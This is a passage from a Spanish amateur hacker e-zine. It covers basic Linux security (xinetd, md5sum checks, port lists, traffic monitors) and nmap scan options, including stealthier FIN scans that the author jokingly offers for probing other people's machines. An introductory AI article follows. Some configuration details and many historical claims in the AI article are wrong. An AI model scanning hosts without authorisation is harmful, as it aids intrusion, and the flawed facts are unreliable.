cliente con la ip 182.52.13.9 que nos cae mal. Para representar el servicio nos quedaría una cosa así:
service ftp
{
socket_type = stream
port = 21
protocol = tcp
user = root
server = /usr/sbin/proftpd
access_times = 17:00-21:00
instances = 5
only_from = 182.52.13.0/32
no_acces = 182.52.13.9
}
Se empieza definiendo el tpo de socket, el puerto que usa el servicio y el protocolo , y despues
empiezo a poner los datos del demonio y como quiero que esté configurado.

Bueno , ya he explicado +/- el uso de inetd y xinetd.


MD5SUM
------
Bueno , este algoritmo nos servira para comprobar que nuestros ficheros más importantes
no han sido modificados. Sabiendo que alguien podría meternos un troyano simplemente
editando dos archivos , o crearse cuentas de usuario modificando el /etc/passwd o /etc/shadow,
es recomendable tener vigilados estos archivos.
Bueno y ahora os preguntareís que tiene que ver el MD5SUMS con todo esto , bueno 
voy a explicarlo un poco: 

El md5 es el algoritmo que normalmente se utiliza para generar una especie de clave,
con la que podremos comprabar posteriormente si el fichero ha sido modificado.
Esto se suele usar mucho en las descargas de ficheros grandes como ISOS, una vez descargadas
generamos la clave de nuevo en nuestro pc y la comprobamos con la que nos dieron , si son iguales
significa que se ha descargado satisfactoriamente y si no , pues ... :)

Bueno, pues todo esto nos puede servir a nososotros para tener vigilados ficheros que no
nos interesa que nadie los modifique.
Voy a poner un ejemplo:
tecnet:~# cat > ejemplo
Esto es un ejemplo
tecnet:~# md5sum ejemplo
0af2587b2cd70d05b9e9b1328ac11949  ejemplo
tecnet:~#
Con esto tenemos generado una clave al archivo ejemplo.
Veamos ahora que pasa si modificamos el archivo ejemplo.

tecnet:~# cat ejemplo
Esto es un ejemplo
Perdon por ser poco original :)
tecnet:~#

Ahora volvemos a genrerar la clave.
tecnet:~# md5sum ejemplo
a1b24521a62e69a191695a85b03cc3be  ejemplo
tecnet:~#
Y comparamos la que teniamos antes con la que tenemos ahora :
1º Al crear el archivo --> 0af2587b2cd70d05b9e9b1328ac11949  ejemplo
2º Al modificarlo      --> a1b24521a62e69a191695a85b03cc3be  ejemplo

Nos damos cuenta de que ha cambiado :), por lo tanto si hicieramos esto con los archivos 
importantes del sistema o de archivos que no queremos que nadie modifique solo tendremos que
generar la clave con md5 y guardarla , después comprabarla cada cierto tiempo.

Para que el md5sums nos compruebe el mismo si coinciden las claves tendremos que hacer lo 
siguiente:
tecnet:~# cat > ejemplo1
Y va otro ejemplo jeje.

tecnet:~# md5sum ejemplo1 > archivo
Con esto guardamos la clave en archivo. Ahora hacemos esto:
tecnet:~# md5sum -c archivo -v
ejemplo1       Correcto
tecnet:~#
Y nos daremos cuenta de que el fichero ejemplo1 no ha sido modificado, en caso de que lo modifiquemos :
tecnet:~# md5sum -c archivo -v
ejemplo1       FALLÓ
md5sum: la comprobación MD5 falló en 1 de 1 fichero(s)
tecnet:~#
La opción -v lo pone en modo verbose , vamos , que en pantalla te salen los avisos :).
-c le dice a md5sum que compruebe.

Con un poco de imaginación nos creariamos un script que lo hiciera atutomaticamente 
cada cierto tiempo , pero eso no viene al tema :).

**AVISO --> Al añadir un user o un nuevo servicio , está claro que el /etc/passwd, el 
/etc/shadow o el /etc/inetd.conf se modificaran :), por lo tanto cuando modifiquemos
estos archivos tendremos que crear una nueva clave. (Esto es una perogrullada , pero por
si acaso :) ) **********************************************************************
************************************************************************************


PUERTOS
-------
Un puerto es un servicio del pc por la que sale o entra información hacia o desde otra maquina.
Si tuviera que empezar a explicar todos los puertos uno a uno, podría volver loco , y seguro que 
nadie la leeria asi que explicare cosas genéricas :

Los puertos entre 1 y 1024 estan reservados por el sistema como estándares a algunos
servicios , por ejemplo el 21 que es el del ftp , el 22 que es el del ssh , el 23 que es
el del telnet ... El resto de puertos, hacen de clientes como el 6667 del irc por ejemplo
se abren cuando ejecuitas una apliación que necesita conexion por internet y abre
un puerto determinado.

PUERTOS IMPORTANTES
-------------------
7/tcp --> ECHO
11/tcp --> Systat
19/tcp --> Chargen
20/tcp ---> FTP DATA
21/tcp ---> FTP
22/tcp ---> SSH
23/tcp ---> Telnet
25/tcp ---> SMTP
42/tcp ---> Nameserver
43/tcp ---> Whois
49/udp -> tacacs
79/tcp ---> Finger
80/tcp ---> WWW
109/tcp --> Pop2
110/tcp --> Pop3
111/tcp --> Sunrpc
139/tcp --> Netbios
143/tcp --> Imap
514/tcp --> Shell
514/udp --> Syslog
2001/tcp -> Cisco-mgmt
3306/tcp -> Mysql
6000/tcp -> Xwindows
6667/tcp -> IRC
8000/tcp -> WWW
8001/tcp -> WWW
8002/tcp -> WWW
8080/tcp -> Webcache
8081/tcp -> Tproxy
12345/tcp -> Netbus
31337/udp -> Backoriffice


CONTROL DE DATOS
----------------
Aquí trataré un poco el tema de utilidades para "controlar" las cosas que ocurren en nuestro
pc así como logs que nos permitirán verlas.

IPPL -----> El ippl sirve para logear las conexiones entrantes a nuestro pc , es bastante
simple de usar, unicamente con poner ippl -n ya tenemos en el tty o el emulador de terminal
que usemos un log que nos muestra las conexiones.
 Ejemplo de una linea del ippl :

Jul  9 15:31:45 port ftp connection attempt from 194.186.28.181

En una misma linea nos indica la fecha , la hora en que se realizó la conexión , el puerto por
el que se realiza y la ip o el nombre del dominio de la persona que ha entrado.
Aunque retocando un poco el /etc/ippl.conf podemos hacer que nos muestre mucha mas info :

Jul  9 23:42:59 port 32838 UDP datagram from 194.224.52.4 (194.224.52.4:53->196.163.1.5:32838)

Nos muestra el tipo de protocolo , el socket y desde donde a donde va dirigido.
También tendremos en /var/log/ippl/ dos logs , que si los configuramos desde el ippl.conf
el ippl mandará directamente a estos logs la información sobre las conexiones, sin necesidad
de poner ippl -n.


IPTRAF ----> El iptraf cumple con las mismas funciones que el ippl y ademas unas cuantas mas jeje
es mas completo que el que nombre anteriormente. Al abrirlo nos aparecerá un menu
en el que nos dejará seleccionar algunas opciones. Voy a explicar brevemente de que trata
cada una de ellas :
IP traffic monitor --> Al entrar en este apartado el iptraf comenzara a mostrarnos en
pantalla el trafico del dispositivo que le especifiquemos. Muestra alguna informacion
mas que el ippl. Voy a poner una linea :

TCP Connections (Source Host:Port) ------------- Packets- ----Bytes Flags- -- Iface
-213.4.131.3:6667                                >      22       2036 -PA-    eth0   
|
-tecnet:32810                                    >      35       2348 --A-    eth0        

Más o menos quedaría algo así , nos indica la interfaz el numero de paquetes el numero
de bytes , las Flags el host y el puerto de quien se intenta conectar y el host y el puerto
del personaje que recibe.
Se puede pedir más informacion simplemente pulsando m.

En general interface statics nos presentará una pantalla similar a esta :
 Iface --------- Total ------- IP ---- NonIP -- BadIP --- Activity ------------------- 
 lo                  0         0          0         0       0.00 kbytes/sec          -
 eth0		  2960	    2960	  0	    0      26.15 kbytes/sec	     -	
 
Esta pantalla practicamente sirve que nos puestre la candidad de datos que circula
por cada uno de nuestros dispositivos.

En detailed interface statics nos muestran la informacion que nos daba en el apartado anterior
pero bastante mas ampliada. Nos muestra la velocidad que tenemos de subida , de bajada  y
la velocidad total y antes nos da numerosa informacion sobre paquetes tcp , udp , icmp ...
Yo creo que con que useis esas opciones ya teneis de sobras xD las otras dos que quedan
no me he detenido nunca a usarlas.

ETHEREAL --> ethereal es otro analizador de paquetes de la red , es muy completo y muestra todo,
y cuando digo todo me refiero a todas las conexiones e intentos de conexiones y tipos que
entran en nuestro pc.
Yo el ethereal lo tengo con una interfaz grafica , y para que empiece a mostrarme la informacion
cdpor pantalla hago lo siguiente :
1º Abro el ethereal ;) sin abrirlo haremos pocas cosas jeje.
2º Vamos a capture y en ethereal capture opciones seleccionamos las opciones que nos
interesen. Yo selecciono mi la interfaz como eth0 y despues activo la opciones de Update list
of packets in real time, para que muestre la informacion en pantalla al mismo tiempo que
la va capturando. Si queremos que nos muestre un periodo de tiempo concreto le damos a capture 
directamente sin activar esta opcion.

TCPDUMP --> Esto es increible , es el mas completo de todos, si quieres controlar todas
los intentos conexiones y demas que circulan por tu pc con un único programa te recomiendo
este.

Bueno , ya tenemos unos cuantos controladores del trafico de nuestra red , ahora vamos a
hablar del nmap , utilidad que nos sirve para escanear puertos de nuestra máquina o 
de una maquina ajena por supuesto ejjeje.

Para ver los puertos que tenemos a la "escucha" de nuestro pc podemos usar el programa
netstat. Con un simple netstat -a |grep " LISTEN " podemos ver los puertos tcp abiertos.
**Nota " LISTEN " no "LISTEN" , con " LISTEN " nos ahorramos tener que ver los sockets de UNIX.

Bueno ahora toca hablar del nmap.Para mi uno de los mejores escaneadores de puertos, es el más completo
de todos los que he usado. Voy a poner unas cuantas opciones
**  nmap ip ----> conseguiremos una lista de los peurtos que tiene abiertos una máquina.
    -------

**  nmap ip -p21 ---> Con esto escanearía un puerto concreto de una máquina, solo tendríamos que sustituir el 21 por otro puerto,
    ------------      ademas podemos escanear un rango de puertos asi por ejemplo con -p21-25,48
    
**  nmap ip -sU ---> Escanea los puertos UDP
    -----------
    
**  nmap ip -sP ---> Este escaneo sirve para mostrarnos que hosts de una red están activos. Lo que hace es mandar paquetes icmp echo request para comprobarlo.
    ----------
    
**  nmap ip -P0 ---> Este escaneo se usa para redes que no responden a los paquetes icmp echo request por sus fire.
    -----------
    
**  nmap ip -sF ---> Escaneo tcp FIN, evita los paquetes syn , es mas "silencioso"
    -----------
    
**  nmap ip -F ----> Realiza un escaneo rapido ejej.
    ----------
    
**  nmap ip -O ----> Nos muestra el sistema operativo del usuario, pero hace mucho ruido ejeje.
    ----------

**  nmap ip -sS ---> Hace un escaneo mandando paquetes TCP SYN half open, llamado así por que no llega a completar la conexión.
    -----------

Se puede pedir al nmap que nos guarde los resultados en un log, con la opcion -o , ( -o archivo.log).
La opcion -v (verbose) nos da mucha informacion sobre el pc al que estamos escaneando
El uso de estas opciones tambien se puede hacer combinado , por ejemplo nmap -sF -P0 ip .
El nmap tiene otras muchas opciones que podreis encontrar en man nmap claro está :).

-----------------------------------------------------------------------------

Bueno aquí termino la primera parte de mi artículo, espero que no halla resultado
aburrida y que querais seguir leyendo el resto de artículos, como ya dije esto
es una base, las cosas se complicarán conforme valla escribiendo más :).
Nos vemos:
						--------------------------
						    By       _TyR
						--------------------------



                  ***************************************************************
                  ***************************** 7 *******************************
                  *********** Introduccion a la Inteligencia Artificial  ********
                  *************************** Anakin ****************************
                  ***************************************************************




  |====================|
  
  |   PrEsEnTaCiOn     |
  
  |====================|


Bien , como  en todos los articulos lo logico es la presentacion i bueno saber almenos el nick 
del Autor aunque no parece repetirse.Mmm mi nick es Arkenoid i con este articulo pretendo que 
entendais algunos aspectos muy basicos de la inteligencia artificial. Otra cosa mas para alguna 
critica , duda , consulta , o alguna otra cosa mi mail es arkenoid@mixmail.com bah lo de siempre.
Espero que el Articulo os guste aunque no he tenido tiempo suficiente ya que ha sido muy 
precipitado para hacerlo de otra materia en fin ... Y la ultimica cosa que os quiero decir es que
el articulo va dirigido a todas aquellas personas que os guste algo de inteligencia artificial o
quiera saber algunos conceptos y a todos los mienbros de los Sweet Devils . Terminando , gracias
por leer este articulo , y  tambien quiero perdin perdon por todas las faltas de ortografia que 
ireis viendo a lo largo del articulo sin nada mas que deciros GRACIAS. 


  |==================|

  |   InTroDuCCioN   |

  |==================

En este apartado os voi a explicar un poco el concepto basico que debemos de tener de I.A i
algunos aspectos a nivel historia quando nacio ... i todo eso .


La inteligencia Artificla nace en la era en cual el hombre va avanzando en busca de nuevas 
tegnologias asin que el hombre creze y busca el progreso hay por el año de 1950 aproximadamente 
fue cuando el mundo dio a conozer lo que era la inteligencia artificial claro que por esa epoca
no era muy avanzada . Los ivestigadores de los años 50  comezaron a dirigir investigaciones en 
las cuales se basavan en una neurona artificial creada unos años anteriores por Waren McCulloch.

Mmmm , una buena deficion de los que es la inteligencia artificial podrias ser esta :  
La inteligencia Artificial es un estudio de la 
ciencia de computacion que , intenta imitar la inteligencia humana , en otras
 palabras un tipo de inteligencia para las maquinas que en 
teoria son capazes de pensar y sacar conclusiones de aquello 
que se les ha  programado.
 
La inteligencia Artificial  se emepzo a utilizar a mediados del siglo XX , fue entonces cuando
comenzo la ingieneria con la inteligencia artificial , un claro uso de la IA podria ser un coche
digital que lleva gps , localizador .. cosas de esas .. ahy muchas cosas con iteligencia 
artificial por ejemplo los misiles inteligentes , que como bien dice el nombre son inteligentes 
porque se les programo inteligencia, capaz de seguir al objetivo y impactar  que en este caso 
seria su principal funcion.

Fue tambien en el siglo XX cuando se ivento el GPS que es otra parte mas de la inteligencia 
artificial ya que el GPS = el solucionador de problemas generales , es decir un programa capaz 
de resolver problemas de sentido comun...

Esto no fue todo , un poco mas adelante como unos 
10 años para alante se produjo otroa avanze un tio llamado  Edward Feigenbaum inicio un proyecto 
de inteligencia artificial ,capaz de pensar
y resolver ante problemas de vida normal , que asin seria com ose formarian las inteligencias 
artificales expertas  (sistemas expertos) que el primero fue denominado "Dentral".

Avanzando mas hacia en futuro aya del año 1980 y 1990 las ventas de software con inteligencia 
artificial augmentaron de manera consirable , la inteligencia artificial pasaria a formar parte 
de nuestra vida .Tambien en estos años fue cuando se desarollaron los lenguajes de programacion 
inteligencia artificial ( lisp i prolog) tambien nace un sistema experto a difenrecia del 
Dentral esta mas desarollado denominado "Eurisko".

Esto a sido una introduccion del concepto I.A , y una poca de historia ... a continucación os 
explico algo sobre la robotica relacionada con la I.A


  |======================|
  
  | Hablando de Robotica |

  |======================|

La robotica , son maquinas programadas por un programamador , a dichos robots se le tiene que 
dar una inteligencia para hacer funciones , como por ejemplo moverse realizar tareas etc... Los 
robots son mas perfectos que los humanos ya que si se le programa por ejemplo para arreglar 
coches , esa funcion la haran a la perfección , es decir menos marjen de error que el de un 
humano que puede comerter un error tonto. Usar un robot tiene su gran ventaja ,ya que lo ahce 
todo a la perfeccion , aunque por otra parte , es un poco costoso crear un robot ya que para 
hacer un robot ahy que diseñar un brazo robotico , capaz de moverse como podria hacerlo el de un 
humano , dicho brazo funcionarapor motores electricos , depués una maquina calculara los angulos 
de las articulaciones para que el movimientos sea posible . Aunque los robots nos acabaran
subtituyendo ,porque cada vez son mas inteligentes , són una buena herramienta para por ejemplo
en una fabrica de productos , se usan robots , aunque dichos robots han provocado muchas perdidas
de trabajo ... jejeje espero que no nos pase como en TERMINATOR :) mm .. creo que me desvie
un poco del tema ;) 

Bien hasta aqui os hice una introduccion ahora pasaremos hablar sobre robotica en serio .. ;)
  
  
 El creciente desarollo de los robots a echo que hoy en dia se aplique mas la robotica en la 
vida cuotiniana mas que los trabajadores , si observaramos un fabrica donde por ejemplo se 
elaboren  productos alimentarios habran mas robots , que personas .Este processo que nació en 
1970 se le denomina un processo llamado "Robotizacion" este termino supones la destruccion de
miles de puestos de trabajos , aunque sus cradores definen la robotizacion como una ayuda 
fundamental para el humano.

A finales de los años 70 tras años de de investigación en la Inteligencia Artificial surgio el
robot. Estos robots eran muchos mas inteligentes , que los de produccion.Uno de los principales
problemas de los robots es la visión , el estudio de este este problema es la percepcion de las 
imagenes , asin que como tienen este problema unsa la tegnica del buska y compata ... Aun que 
los robots no son desos de la tele , hoy en dia ahy robots con inteligencia articial muy 
complejos , donde mas estan desarollados es en la fabricas de producción.


  |====================|
  
  | SiSTeMaS ExPeRToS  |
  
  |====================|

Que es eso de los sistemas Expertos ... 

Los Sistemas Expertos no son otra cosa que un tipo de sofware que imintan el pesamiento humano
, en la resolucion de problemas , en otras palabras un sofware capaz de pensar como lo haria una
persona norma y corriente ante un problema. Pueden alamacenar muchos conocimeintos de expertos ,
y solucionar el problemas rapidamente con el GPS = Al metodo genetal de resolución de problemas o
por deducion .

Los S.E usna mucho la inteligencia artificial , un sistema experto que este operativo debera estar
en condiciones de combinar tipos de informacion distintas de manera precisa y exacta como lo haria
un humano.

Un Sistema Experto debe ser capaz de resolver cualquier problema , que se le haya programado antes
en la memoria .

-Sacar la respuesta  y Justificarlas, es de logica que si se le plantea un problema para cual el
Sistema Experto esta programado que lo resuelva

Los sistemas expertos se dividen en 3 formas dependiendo de sin són : Base de hechos ,Motor de
Inferencia,Base de conocimeintos .


   |===================|
   
   | Maquina Vs Humano |  [ A c l a r a c i o n ]
   
   |===================|
 

LLegado hasta este punto , quiero alclarar que una maquina , hoy por hoy no esta capazitada para
pensar sobre un problema determinado imprevisto , una maquina con inteligencia articial nada mas
esta preparada para pensar sobre aquello que se la a programado, encambio un humano , puede pensar
en situaciones , y usar el sentido común , en cambio una maquina sobre una duda jamas podria
hacerlo sino esta programado para ello ... Hoy en dia el humano esta mas arriba que la maquinas ,
aunque las maquinas almacenan bien la inforamcion , son mas rapidas manejando informacion etc ,etc
no olvidemos que fue un humano quien las invento y que hoy por hoy el humano tiene "picardia"
una cosa que la maquina no tiene , Las maquinas en conclusion son unas inutiles , solo sirven
para aquello que se les programo , aunque fue un gran avanze ... no se puede llegar a comparar
por ahora una maquina con inteligencia artificial y un humano.

gracias a todos lo que lo habeis leido un Sal2 para todos.

                                                      Anakin



*************************************
************ EDITORIAL **************
*************************************
*************************************

Hemos llegado al final de esta Datacode #4, las demas seguiran saliendo con un intervalo de 2 o 3
meses. Espero que todos los articulos les allan gustado y si tienes alguna sugerencia o critica
lo puedes hacer a nuestro e-mail: sweet_devils@mixmail.com
Las faltas de ortografia son responsabilidad de los autores de cada articulo :).
El articulo de SHOT no ha podido ser publicado ya que hemos tardado mucho en sacar esta datacode
y por cuestiones de tiempo se ha visto el articulo un poco viejito ya que trataba de virus.

Un saludo muy grande y un cordial abrazo 

                                                   El Editor

